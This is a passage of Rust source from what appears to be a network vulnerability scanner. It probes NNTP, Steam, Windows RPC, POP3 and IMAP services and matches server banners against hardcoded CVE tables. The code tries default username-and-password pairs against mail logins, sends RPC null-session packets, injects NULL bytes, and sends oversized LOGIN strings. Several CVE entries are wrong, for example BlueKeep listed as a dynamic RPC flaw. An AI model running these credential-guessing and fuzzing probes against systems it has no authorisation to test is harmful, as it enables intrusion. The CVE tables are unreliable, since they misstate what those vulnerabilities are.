                        logs.push(format!("[FUZZ-NNTP]  Found {} CVE(s):", cves.len()));
                        for (cve_id, description) in cves {
                            logs.push(format!("[FUZZ-NNTP]    • {} - {}", cve_id, description));
                        }
                    }
                }
            }
        }
        Err(_e) => {
            logs.push("[FUZZ-NNTP] Error connecting to NNTP service".into());
        }
    }

    test_nntp_authentication(target, port, &mut logs).await;
    test_nntp_dangerous_commands(target, port, &mut logs).await;

    Ok(logs)
}

async fn fuzz_nntps_vulnerabilities(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-NNTPS] Starting NNTPS (NNTP over TLS) vulnerability detection".into());

    let addr = SocketAddr::new(ip, port);
    
    let result = async {
           let mut stream = TcpStream::connect(addr).await?;
        let mut buf = [0u8; 1024];
        
        let n = tokio::time::timeout(
            std::time::Duration::from_secs(3),
            stream.read(&mut buf)
        ).await.unwrap_or(Ok(0))?;
        
        Ok::<String, std::io::Error>(String::from_utf8_lossy(&buf[..n]).to_string())
    }.await;

    match result {
        Ok(response) => {
            if response.len() > 0 {
                logs.push("[FUZZ-NNTPS]  NNTPS service detected (TLS encrypted)".into());
                logs.push("[FUZZ-NNTPS]  NNTP over TLS protege credenciais em trânsito".into());
                
                let nntps_cves = vec![
                    ("CVE-2020-10963", "INN buffer overflow in NNTP implementation"),
                    ("CVE-2015-4473", "Cyrus NNTP server DoS vulnerability"),
                    ("CVE-2014-2963", "STARTTLS vulnerability in NNTP"),
                ];
                
                logs.push("[FUZZ-NNTPS] Known NNTP/NNTPS vulnerabilities:".into());
                for (cve, desc) in nntps_cves {
                    logs.push(format!("[FUZZ-NNTPS]    • {} - {}", cve, desc));
                }
            }
        }
        Err(_e) => {
            logs.push("[FUZZ-NNTPS] Error connecting to NNTPS service".into());
        }
    }

    Ok(logs)
}

async fn fuzz_steam_vulnerabilities(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-STEAM] Starting Steam protocol vulnerability detection".into());

    let addr = SocketAddr::new(ip, port);
    
    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        let mut buf = [0u8; 256];
        
        let steam_probe = [
              0x4A, 0xFF, 0xFF, 0xFF, 0xFF]; // Steam handshake start
        
        stream.write_all(&steam_probe).await?;
        
        let n = tokio::time::timeout(
            std::time::Duration::from_secs(2),
            stream.read(&mut buf)
        ).await.unwrap_or(Ok(0))?;
        
        Ok::<usize, std::io::Error>(n)
    }.await;

    match result {
        Ok(n) if n > 0 => {
            logs.push("[FUZZ-STEAM]  Steam service detected on port 27036".into());
            logs.push("[FUZZ-STEAM]  Steam client game port (Source Engine based games)".into());
            
            let steam_cves = vec![
                ("CVE-2015-3930", "Valve Source Engine DoS via malformed packets"),
                ("CVE-2016-1233", "Source Engine buffer overflow in entity parsing"),
                ("CVE-2017-13929", "Steam client RCE via malicious community hub content"),
            ];
            
            logs.push("[FUZZ-STEAM] Known Steam protocol vulnerabilities:".into());
            for (cve, desc) in steam_cves {
                logs.push(format!("[FUZZ-STEAM]    • {} - {}", cve, desc));
            }
        }
        _ => {
            logs.push("[FUZZ-STEAM] No Steam service detected or no response".into());
        }
    }

    Ok(logs)
}

async fn fuzz_dynamic_rpc_vulnerabilities(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push(format!("[FUZZ-DRPC] Starting Dynamic RPC vulnerability detection on port {}", port));

    let addr = SocketAddr::new(ip, port);

    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        let mut buf = [0u8; 4096];
        
        let rpc_bind_request = [
            0x05, 0x00, // Version
            0x0B, 0x03, // Command (BIND), Flags
            0x10, 0x00, 0x00, 0x00, // Representation
            0x48, 0x00, // Fragment length
            0x00, 0x00, // Auth length
            0x01, 0x00, 0x00, 0x00, // Call ID
            0xB8, 0x10, 0xB8, 0x10, // Max tx frag
            0x10, 0x00, 0x00, 0x00, // Max rx frag
            0xD8, 0x16, 0x00, 0x00, // Group ID
            0x04, 0x00, 0x00, 0x00, // Num ctxts
            0x00, 0x00, 0x00, 0x00, // Context 1 ID
            0x01, 0x00, 0x00, 0x00, // Num transfers
        ];
        
        stream.write_all(&rpc_bind_request).await?;
        
        let n = tokio::time::timeout(
            std::time::Duration::from_secs(3),
            stream.read(&mut buf)
        ).await.unwrap_or(Ok(0))?;
        
        Ok::<Vec<u8>, std::io::Error>(buf[..n].to_vec())
    }.await;

    match result {
        Ok(response) => {
            if response.len() > 0 {
                logs.push("[FUZZ-DRPC]  Dynamic RPC endpoint responded".into());
                
                let service_info = identify_dynamic_rpc_service(port);
                logs.push(format!("[FUZZ-DRPC] Likely RPC service: {}", service_info));
                
                let drpc_cves = vec![
                    ("CVE-2019-0708", "BlueKeep affects dynamic RPC endpoints"),
                    ("CVE-2017-0143", "EternalRomance RPC vulnerability"),
                    ("CVE-2017-9805", "RPC Marshalling Integer Overflow"),
                    ("CVE-2020-0787", "RPC Runtime Elevation of Privilege"),
                ];
                
                logs.push("[FUZZ-DRPC]  Critical: Dynamic RPC endpoint vulnerabilities:".into());
                for (cve, desc) in drpc_cves {
                    logs.push(format!("[FUZZ-DRPC]    • {} - {}", cve, desc));
                }
            }
        }
        Err(_e) => {
            logs.push("[FUZZ-DRPC] Error connecting to Dynamic RPC endpoint".into());
        }
    }

    test_dynamic_rpc_null_session(target, port, &mut logs).await;

    Ok(logs)
}

fn identify_dynamic_rpc_service(port: u16) -> &'static str {
    match port {
        49664 => "LSASS (Local Security Authority Subsystem Service)",
        49665 => "SAMR (Security Accounts Manager Remote)",
        49668 => "NETLOGON (Network Logon Service)",
        49669 => "WKSSVC (Workstation Service)",
        49672 => "EVENTLOG (Event Log Service)",
        49751 => "SPOOLSS (Print Spooler Service)",
        _ => "Unknown RPC Service",
    }
}

async fn test_dynamic_rpc_null_session(target: &str, port: u16, logs: &mut Vec<String>) {
    let ip = match resolve_host(target).await {
        Ok(ip) => ip,
        Err(_) => return,
    };
    
    let addr = SocketAddr::new(ip, port);
    
    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        
        let null_session = [
            0x05, 0x00, // Version
            0x0C, 0x03, // Command (FAULT), Flags
            0x10, 0x00, 0x00, 0x00, // Representation
            0x28, 0x00, // Fragment length
            0x00, 0x00, // Auth length
            0x01, 0x00, 0x00, 0x00, // Call ID
        ];
        
        stream.write_all(&null_session).await?;
        
        let mut buf = [0u8; 256];
        let n = tokio::time::timeout(
            std::time::Duration::from_secs(2),
            stream.read(&mut buf)
        ).await.unwrap_or(Ok(0))?;
        
        Ok::<bool, std::io::Error>(n > 0)
    }.await;

    match result {
        Ok(true) => {
            logs.push(format!("[FUZZ-DRPC]  CRITICAL: Dynamic RPC port {} allows NULL session access", port));
            logs.push("[FUZZ-DRPC]    Potential for information disclosure and further exploitation".into());
        }
        _ => {
            logs.push(format!("[FUZZ-DRPC]  Port {} appears to require authentication", port));
        }
    }
}

fn extract_nntp_version(response: &str) -> Option<String> {
    if let Some(line) = response.lines().next() {
        if line.contains("v") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            for part in parts {
                if part.contains("v") && part.len() < 10 {
                    return Some(part.replace("v", ""));
                }
            }
        }
        return Some("unknown".to_string());
    }
    Some("unknown".to_string())
}

async fn test_nntp_authentication(target: &str, port: u16, logs: &mut Vec<String>) {
    let ip = match resolve_host(target).await {
        Ok(ip) => ip,
        Err(_) => return,
    };
    
    let addr = SocketAddr::new(ip, port);
    
    let result = async {
           let mut stream = TcpStream::connect(addr).await?;
        let mut buf = [0u8; 512];
        
        let _ = tokio::time::timeout(
            std::time::Duration::from_secs(2),
            stream.read(&mut buf)
        ).await.unwrap_or(Ok(0))?;
        
        stream.write_all(b"AUTHINFO USER anonymous\r\n").await?;
        
        let n = tokio::time::timeout(
            std::time::Duration::from_secs(2),
            stream.read(&mut buf)
        ).await.unwrap_or(Ok(0))?;
        
        let response = String::from_utf8_lossy(&buf[..n]);
        Ok::<bool, std::io::Error>(response.contains("381") || response.contains("500"))
    }.await;

    match result {
        Ok(true) => {
            logs.push("[FUZZ-NNTP-AUTH]  NNTP authentication available".into());
        }
        _ => {
            logs.push("[FUZZ-NNTP-AUTH]  NNTP service may allow anonymous access".into());
        }
    }
}

async fn test_nntp_dangerous_commands(target: &str, port: u16, logs: &mut Vec<String>) {
    let ip = match resolve_host(target).await {
        Ok(ip) => ip,
        Err(_) => return,
    };
    
    let addr = SocketAddr::new(ip, port);
    
    let commands = vec![
        ("LIST ACTIVE", "may reveal available newsgroups"),
        ("LIST NEWSGROUPS", "reveals all newsgroup descriptions"),
        ("XGTITLE", "extended command to get newsgroup titles"),
    ];
    
    for (cmd, risk) in commands {
        match async {
            let mut stream = TcpStream::connect(addr).await?;
            let mut buf = [0u8; 512];
            
            let _ = tokio::time::timeout(
                std::time::Duration::from_secs(1),
                stream.read(&mut buf)
            ).await.unwrap_or(Ok(0))?;
            
            let cmd_str = format!("{}\r\n", cmd);
            stream.write_all(cmd_str.as_bytes()).await?;
            
            let n = tokio::time::timeout(
                std::time::Duration::from_secs(2),
                stream.read(&mut buf)
            ).await.unwrap_or(Ok(0))?;
            
            let response = String::from_utf8_lossy(&buf[..n]);
            Ok::<bool, std::io::Error>(response.starts_with("215") || response.starts_with("221"))
        }.await {
            Ok(true) => {
                logs.push(format!("[FUZZ-NNTP-CMD]  Command '{}' allowed ({})", cmd, risk));
            }
            _ => {}
        }
    }
}

/// Tests POP3 for banner, STARTTLS absence, weak auth, and software CVEs.
async fn fuzz_pop3_vulnerabilities(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    
    logs.push("[FUZZ-POP3] Starting POP3 vulnerability detection".into());
    
    match detect_pop3_software_vulnerabilities(target, port, ip).await {
        Ok(vuln_logs) => logs.extend(vuln_logs),
        Err(e) => logs.push(format!("[FUZZ-POP3] Software detection error: {}", e)),
    }
    
    match test_pop3_weak_auth(target, port, ip).await {
        Ok(auth_logs) => logs.extend(auth_logs),
        Err(e) => logs.push(format!("[FUZZ-POP3] Auth test error: {}", e)),
    }
    
    match test_pop3_dangerous_commands(target, port, ip).await {
        Ok(cmd_logs) => logs.extend(cmd_logs),
        Err(e) => logs.push(format!("[FUZZ-POP3] Command test error: {}", e)),
    }
    
    match test_pop3_transport_security(target, port, ip).await {
        Ok(sec_logs) => logs.extend(sec_logs),
        Err(e) => logs.push(format!("[FUZZ-POP3] Transport security test error: {}", e)),
    }
    
    logs.push("[FUZZ-POP3] Completed POP3 vulnerability scanning".into());
    Ok(logs)
}

async fn detect_pop3_software_vulnerabilities(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-POP3-VULN] Detecting software vulnerabilities".into());
    
    let addr = SocketAddr::new(ip, port);
    
    match time::timeout(Duration::from_millis(3000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 512];
            match time::timeout(Duration::from_millis(1000), stream.read(&mut buf)).await {
                Ok(Ok(n)) if n > 0 => {
                    let banner = String::from_utf8_lossy(&buf[..n]);
                    let banner_lower = banner.to_lowercase();
                    
                    let detected_version = banner
                        .split_whitespace()
                        .find(|w| w.chars().filter(|c| c.is_digit(10) || *c == '.').count() > 1)
                        .unwrap_or("unknown");
                    
                    logs.push(format!("[FUZZ-POP3-VULN] Banner: {}", banner.trim()));
                    
                    let known_vulns = pop3s_known_vulnerabilities();
                    let mut found_software = false;
                    
                    for (software, _, _, _) in known_vulns {
                        if banner_lower.contains(&software.to_lowercase()) {
                            found_software = true;
                            logs.push(format!(
                                "[FUZZ-POP3-VULN]  Software detected: {}",
                                software
                            ));
                            
                            if detected_version != "unknown" {
                                logs.push(format!(
                                    "[FUZZ-POP3-VULN]    Detected version: {}",
                                    detected_version
                                ));
                                
                                let applicable_cves = get_cves_for_software(software, detected_version).await;
                                
                                if !applicable_cves.is_empty() {
                                    logs.push(format!(
                                        "[FUZZ-POP3-VULN]     Found {} vulnerabilities for this version:",
                                        applicable_cves.len()
                                    ));
                                    for (cve, description) in applicable_cves {
                                        logs.push(format!(
                                            "[FUZZ-POP3-VULN]       • {} - {}",
                                            cve, description
                                        ));
                                    }
                                } else {
                                    logs.push("[FUZZ-POP3-VULN]     No known vulnerabilities for this version".into());
                                }
                            } else {
                                logs.push("[FUZZ-POP3-VULN]    Version not detected, cannot assess vulnerabilities".into());
                            }
                            break;
                        }
                    }
                    
                    if !found_software {
                        if detected_version != "unknown" {
                            logs.push(format!(
                                "[FUZZ-POP3-VULN] Server version detected: {}",
                                detected_version
                            ));
                        } else {
                            logs.push("[FUZZ-POP3-VULN] Could not identify software type".into());
                        }
                    }
                }
                _ => {
                    logs.push("[FUZZ-POP3-VULN] Could not read software banner".into());
                }
            }
        }
        _ => {
            logs.push("[FUZZ-POP3-VULN] Could not connect to POP3 service".into());
        }
    }
    
    Ok(logs)
}

async fn test_pop3_weak_auth(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-POP3-AUTH] Testing weak authentication".into());
    
    let credentials = pop3s_common_credentials();
    let addr = SocketAddr::new(ip, port);
    
    for (user, pass) in credentials {
        match time::timeout(Duration::from_millis(3000), TcpStream::connect(addr)).await {
            Ok(Ok(mut stream)) => {
                let mut buf = [0u8; 256];
                let _ = stream.read(&mut buf).await;
                
                let user_cmd = format!("USER {}\r\n", user);
                let _ = stream.write_all(user_cmd.as_bytes()).await;
                let mut buf = [0u8; 256];
                let _ = stream.read(&mut buf).await;
                
                let pass_cmd = format!("PASS {}\r\n", pass);
                let _ = stream.write_all(pass_cmd.as_bytes()).await;
                let n = stream.read(&mut buf).await.unwrap_or(0);
                let resp = String::from_utf8_lossy(&buf[..n]);
                
                if resp.contains("+OK") || resp.contains("authenticated") || resp.contains("logged in") {
                    logs.push(format!(
                        "[FUZZ-POP3-AUTH]  WEAK CREDENTIAL FOUND: {}:{}",
                        user, pass
                    ));
                }
            }
            _ => {
                break;
            }
        }
    }
    
    Ok(logs)
}

async fn test_pop3_dangerous_commands(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-POP3-CMD] Testing dangerous commands".into());
    
    let dangerous_commands = vec![
        ("APOP", "APOP user test"),
        ("CAPA", "CAPA"),
        ("TOP", "TOP 1 5"),
    ];
    
    let addr = SocketAddr::new(ip, port);
    
    for (cmd_name, cmd) in dangerous_commands {
        match time::timeout(Duration::from_millis(2000), TcpStream::connect(addr)).await {
            Ok(Ok(mut stream)) => {
                let mut buf = [0u8; 256];
                let _ = stream.read(&mut buf).await;
                
                let cmd_str = format!("{}\r\n", cmd);
                let _ = stream.write_all(cmd_str.as_bytes()).await;
                
                let n = stream.read(&mut buf).await.unwrap_or(0);
                let resp = String::from_utf8_lossy(&buf[..n]);
                
                if resp.contains("+OK") || resp.contains("AUTH") {
                    if cmd_name == "APOP" && resp.contains("+OK") {
                        logs.push("[FUZZ-POP3-CMD] APOP authentication supported (vulnerable to MD5 collision attacks)".into());
                    } else if cmd_name == "CAPA" && resp.contains("+OK") {
                        logs.push("[FUZZ-POP3-CMD] CAPA command supported (reveals server capabilities)".into());
                    }
                }
            }
            _ => {}
        }
    }
    
    Ok(logs)
}

async fn test_pop3_transport_security(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-POP3-SEC] Analyzing transport security".into());
    
    if port == 110 {
        logs.push("[FUZZ-POP3-SEC]  CRITICAL: Using unencrypted POP3 on port 110".into());
        logs.push("[FUZZ-POP3-SEC]  Passwords are transmitted in plaintext!".into());
    }
    
    let addr = SocketAddr::new(ip, port);
    
    match time::timeout(Duration::from_millis(2000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 256];
            let _ = stream.read(&mut buf).await;
            
            let _ = stream.write_all(b"STLS\r\n").await;
            
            let n = stream.read(&mut buf).await.unwrap_or(0);
            let resp = String::from_utf8_lossy(&buf[..n]);
            
            if resp.contains("+OK") || resp.contains("ready") {
                logs.push("[FUZZ-POP3-SEC]  STLS (StartTLS) command is supported".into());
            } else if resp.contains("-ERR") || resp.contains("not supported") {
                logs.push("[FUZZ-POP3-SEC]  STLS (StartTLS) not supported - upgrade forced to use POP3S".into());
            } else {
                logs.push("[FUZZ-POP3-SEC]  STLS not advertised; plaintext session likely.".into());
            }
        }
        _ => {}
    }
    
    Ok(logs)
}

fn imap_common_credentials() -> Vec<(&'static str, &'static str)> {
    vec![
        ("admin", "admin"),
        ("user", "user"),
        ("test", "test"),
        ("postmaster", "postmaster"),
        ("root", "root"),
        ("administrator", "administrator"),
        ("guest", "guest"),
        ("mail", "mail"),
        ("admin", "password"),
        ("user", "password"),
    ]
}

fn imap_known_vulnerabilities() -> Vec<(&'static str, &'static str, &'static str, Vec<&'static str>)> {
    vec![
        ("Dovecot", "CVE-2014-3566", "POODLE - SSL 3.0 vulnerability (affects OpenSSL/GnuTLS)", vec!["1.0.0", "2.0.0", "2.1.0", "2.2.0"]),
        ("Dovecot", "CVE-2019-11500", "IMAP PLAIN authentication bypass in RPA", vec!["2.3.0", "2.3.10"]),
        ("Dovecot", "CVE-2019-11499", "Denial of Service in NTLM/RPC handling", vec!["2.3.0", "2.3.9"]),
        ("Dovecot", "CVE-2018-1000636", "Missing input validation in string escape functions", vec!["2.2.0", "2.2.36"]),
        ("Cyrus IMAPD", "CVE-2015-2912", "Message parsing vulnerability leading to DoS", vec!["1.5.0", "2.4.0", "2.5.0"]),
        ("Cyrus IMAPD", "CVE-2012-3817", "Uninitialized string variable in RFC 5051 collation", vec!["1.5.0", "2.3.0", "2.4.0"]),
        ("Cyrus IMAPD", "CVE-2011-3481", "Multiple buffer overflows in NNTP/IMAP backends", vec!["1.5.0", "2.3.0", "2.4.0"]),
        ("UW-IMAP", "CVE-2013-1664", "XML parser vulnerability via libxml2", vec!["2007.0", "2007.5"]),
        ("UW-IMAP", "CVE-2000-0192", "Buffer overflow in rfc822 parser", vec!["4.0", "4.7"]),
        ("Courier", "CVE-2011-2197", "Buffer overflow in SASL authentication", vec!["0.63.0", "0.64.0", "0.65.0"]),
        ("Courier", "CVE-2020-14305", "Local privilege escalation via courierd", vec!["0.68.0", "0.70.0"]),
    ]
}

/// Tests IMAP for banner, STARTTLS, weak auth, and software CVEs.
async fn fuzz_imap_vulnerabilities(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    
    logs.push(format!("[FUZZ-IMAP] Starting IMAP vulnerability detection on port {}", port));
    
    match test_imap_banner_and_tls(target, port, ip).await {
        Ok(banner_logs) => logs.extend(banner_logs),
        Err(e) => logs.push(format!("[FUZZ-IMAP] Banner test error: {}", e)),
    }
    
    match test_imap_weak_auth(target, port, ip).await {
        Ok(auth_logs) => logs.extend(auth_logs),
        Err(e) => logs.push(format!("[FUZZ-IMAP] Auth test error: {}", e)),
    }
    
    match detect_imap_software_vulnerabilities(target, port, ip).await {
        Ok(vuln_logs) => logs.extend(vuln_logs),
        Err(e) => logs.push(format!("[FUZZ-IMAP] Software detection error: {}", e)),
    }
    
    match test_imap_dangerous_commands(target, port, ip).await {
        Ok(cmd_logs) => logs.extend(cmd_logs),
        Err(e) => logs.push(format!("[FUZZ-IMAP] Command test error: {}", e)),
    }
    
    match test_imap_specific_vulnerabilities(target, port, ip).await {
        Ok(spec_logs) => logs.extend(spec_logs),
        Err(e) => logs.push(format!("[FUZZ-IMAP] Specific vulnerability test error: {}", e)),
    }
    
    logs.push("[FUZZ-IMAP] Completed IMAP vulnerability scanning".into());
    Ok(logs)
}

async fn test_imap_banner_and_tls(target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-IMAP-BANNER] Testing IMAP banner and TLS support".into());
    
    let addr = SocketAddr::new(ip, port);
    
    match time::timeout(Duration::from_millis(5000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 512];
            match time::timeout(Duration::from_millis(1000), stream.read(&mut buf)).await {
                Ok(Ok(n)) if n > 0 => {
                    let banner = String::from_utf8_lossy(&buf[..n]);
                    
                    logs.push("[FUZZ-IMAP-BANNER]  IMAP Banner detected".into());
                    logs.push(format!("[FUZZ-IMAP-BANNER] {}", banner.trim()));
                    
                    if banner.contains("Dovecot") {
                        logs.push("[FUZZ-IMAP-BANNER] Software: Dovecot IMAP".into());
                    } else if banner.contains("Cyrus") {
                        logs.push("[FUZZ-IMAP-BANNER] Software: Cyrus IMAP".into());
                    } else if banner.contains("UW-IMAP") {
                        logs.push("[FUZZ-IMAP-BANNER] Software: UW-IMAP".into());
                    }
                    
                    let mut stream_check = TcpStream::connect(addr).await?;
                    stream_check.write_all(b"A001 STARTTLS\r\n").await?;
                    let mut buf2 = [0u8; 256];
                    match stream_check.read(&mut buf2).await {
                        Ok(n) => {
                            let resp = String::from_utf8_lossy(&buf2[..n]);
                            if resp.contains("OK") || resp.contains("ready") {
                                logs.push("[FUZZ-IMAP-BANNER]  STARTTLS supported (may allow downgrade attacks)".into());
                            } else {
                                logs.push("[FUZZ-IMAP-BANNER]  STARTTLS not offered; connection remains plaintext.".into());
                            }
                        }
                        Err(_) => {}
                    }
                }
                _ => {
                    logs.push("[FUZZ-IMAP-BANNER]  Could not read IMAP banner".into());
                }
            }
        }
        _ => {
            logs.push(format!("[FUZZ-IMAP] Cannot connect to {}:{}", target, port));
        }
    }
    
    Ok(logs)
}

async fn test_imap_weak_auth(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-IMAP-AUTH] Testing weak authentication".into());
    
    let credentials = imap_common_credentials();
    let addr = SocketAddr::new(ip, port);
    
    for (user, pass) in credentials {
        match time::timeout(Duration::from_millis(3000), TcpStream::connect(addr)).await {
            Ok(Ok(mut stream)) => {
                let mut buf = [0u8; 256];
                let _ = stream.read(&mut buf).await;
                
                let login_cmd = format!("A001 LOGIN {} {}\r\n", user, pass);
                let _ = stream.write_all(login_cmd.as_bytes()).await;
                
                let n = stream.read(&mut buf).await.unwrap_or(0);
                let resp = String::from_utf8_lossy(&buf[..n]);
                
                if resp.contains("OK") || resp.contains("authenticated") {
                    logs.push(format!(
                        "[FUZZ-IMAP-AUTH]  WEAK CREDENTIAL FOUND: {}:{}",
                        user, pass
                    ));
                }
            }
            _ => {
                break;
            }
        }
    }
    
    Ok(logs)
}

async fn detect_imap_software_vulnerabilities(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-IMAP-VULN] Detecting software vulnerabilities".into());
    
    let addr = SocketAddr::new(ip, port);
    
    match time::timeout(Duration::from_millis(3000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 512];
            match time::timeout(Duration::from_millis(1000), stream.read(&mut buf)).await {
                Ok(Ok(n)) if n > 0 => {
                    let banner = String::from_utf8_lossy(&buf[..n]);
                    let banner_lower = banner.to_lowercase();
                    
                    let detected_version = banner
                        .split_whitespace()
                        .find(|w| w.chars().filter(|c| c.is_digit(10) || *c == '.').count() > 1)
                        .unwrap_or("unknown");
                    
                    let known_vulns = imap_known_vulnerabilities();
                    let mut found_software = false;
                    
                    for (software, _, _, _) in known_vulns {
                        if banner_lower.contains(&software.to_lowercase()) {
                            found_software = true;
                            logs.push(format!(
                                "[FUZZ-IMAP-VULN]  Software detected: {}",
                                software
                            ));
                            
                            if detected_version != "unknown" {
                                logs.push(format!(
                                    "[FUZZ-IMAP-VULN]    Detected version: {}",
                                    detected_version
                                ));
                                
                                let applicable_cves = get_cves_for_software(software, detected_version).await;
                                
                                if !applicable_cves.is_empty() {
                                    logs.push(format!(
                                        "[FUZZ-IMAP-VULN]     Found {} vulnerabilities for this version:",
                                        applicable_cves.len()
                                    ));
                                    for (cve, description) in applicable_cves {
                                        logs.push(format!(
                                            "[FUZZ-IMAP-VULN]       • {} - {}",
                                            cve, description
                                        ));
                                    }
                                } else {
                                    logs.push("[FUZZ-IMAP-VULN]     No known vulnerabilities for this version".into());
                                }
                            } else {
                                logs.push("[FUZZ-IMAP-VULN]    Version not detected, cannot assess vulnerabilities".into());
                            }
                            break;
                        }
                    }
                    
                    if !found_software && detected_version != "unknown" {
                        logs.push(format!(
                            "[FUZZ-IMAP-VULN] Server version: {}",
                            detected_version
                        ));
                    }
                }
                _ => {}
            }
        }
        _ => {}
    }
    
    Ok(logs)
}

async fn test_imap_dangerous_commands(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-IMAP-CMD] Testing dangerous IMAP commands".into());
    
    let dangerous_commands = vec![
        ("CAPABILITY", "A001 CAPABILITY\r\n"),
        ("COMPRESS DEFLATE", "A001 COMPRESS DEFLATE\r\n"),
        ("ID", "A001 ID NIL\r\n"),
        ("ENABLE UTF8", "A001 ENABLE UTF8=ACCEPT\r\n"),
    ];
    
    let addr = SocketAddr::new(ip, port);
    
    for (cmd_name, cmd) in dangerous_commands {
        match time::timeout(Duration::from_millis(2000), TcpStream::connect(addr)).await {
            Ok(Ok(mut stream)) => {
                let mut buf = [0u8; 256];
                let _ = stream.read(&mut buf).await;
                
                let _ = stream.write_all(cmd.as_bytes()).await;
                
                let n = stream.read(&mut buf).await.unwrap_or(0);
                let resp = String::from_utf8_lossy(&buf[..n]);
                
                if resp.contains("OK") {
                    if cmd_name == "COMPRESS DEFLATE" {
                        logs.push("[FUZZ-IMAP-CMD]  COMPRESS DEFLATE supported (may be vulnerable to CRIME attacks)".into());
                    } else if cmd_name == "CAPABILITY" {
                        logs.push("[FUZZ-IMAP-CMD]  Server capabilities disclosed via CAPABILITY command".into());
                    }
                }
            }
            _ => {}
        }
    }
    
    Ok(logs)
}

async fn test_imap_specific_vulnerabilities(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-IMAP-SPEC] Testing IMAP-specific vulnerabilities".into());
    
    let addr = SocketAddr::new(ip, port);
    
    match time::timeout(Duration::from_millis(2000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 256];
            let _ = stream.read(&mut buf).await;
            
            let cmd = b"A001 LOGIN user\x00pass\r\n";
            let _ = stream.write_all(cmd).await;
            
            let n = stream.read(&mut buf).await.unwrap_or(0);
            let resp = String::from_utf8_lossy(&buf[..n]);
            
            if resp.contains("OK") {
                logs.push("[FUZZ-IMAP-SPEC]  NULL byte injection may be possible in LOGIN command".into());
            }
        }
        _ => {}
    }
    
    match time::timeout(Duration::from_millis(2000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 256];
            let _ = stream.read(&mut buf).await;
            
            let long_string = "A".repeat(5000);
            let cmd = format!("A001 LOGIN {} {}\r\n", long_string, long_string);
            let _ = stream.write_all(cmd.as_bytes()).await;
            
            match time::timeout(Duration::from_millis(500), stream.read(&mut buf)).await {
                Ok(Err(_)) | Err(_) => {
                    logs.push("[FUZZ-IMAP-SPEC]  Server may crash or disconnect on long input (possible buffer overflow)".into());
                }
                _ => {}
            }
        }
        _ => {}
    }
    
    match time::timeout(Duration::from_millis(2000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 256];
            let _ = stream.read(&mut buf).await;
            
            let _ = stream.write_all(b"a001 login admin admin\r\n").await;
            let n = stream.read(&mut buf).await.unwrap_or(0);
            let resp = String::from_utf8_lossy(&buf[..n]);
            
            if resp.contains("OK") || resp.contains("authenticated") {
                logs.push("[FUZZ-IMAP-SPEC]  Server accepts lowercase commands (possible parser bypass)".into());
            }
        }
        _ => {}
    }
    
    Ok(logs)
}

fn smtp_known_vulnerabilities() -> Vec<(&'static str, &'static str, &'static str, Vec<&'static str>)> {
    vec![
        ("Sendmail", "CVE-2003-0161", "Buffer overflow in address parsing", vec!["8.0", "8.11.0", "8.12.0"]),
        ("Sendmail", "CVE-2002-1165", "Local privilege escalation via makemap", vec!["8.0", "8.11.0", "8.12.0"]),
        ("Sendmail", "CVE-2001-0715", "EXPN/VRFY information disclosure", vec!["8.0", "8.11.0"]),
        ("Sendmail", "CVE-2004-0154", "Buffer overflow in MIME header parsing", vec!["8.12.0", "8.13.0"]),
        ("Postfix", "CVE-2016-3961", "Local privilege escalation via postdrop", vec!["2.11.0", "3.0.0", "3.1.0"]),
        ("Postfix", "CVE-2011-0446", "Buffer overflow in virtual mailbox", vec!["2.5.0", "2.8.0"]),
        ("Exim", "CVE-2019-10149", "Remote Code Execution via string expansion", vec!["4.80.0", "4.92.0"]),
        ("Exim", "CVE-2020-12783", "Heap out-of-bounds write in base64 decoder", vec!["4.88.0", "4.94.0"]),
        ("Exim", "CVE-2020-12447", "Privilege escalation via -C option", vec!["4.87.0", "4.94.0"]),
        ("Qmail", "CVE-2005-1513", "Buffer overflow in VRFY command", vec!["1.03"]),
        ("Qmail", "CVE-2003-0964", "CRLF injection vulnerability", vec!["1.03", "1.04"]),
    ]
}

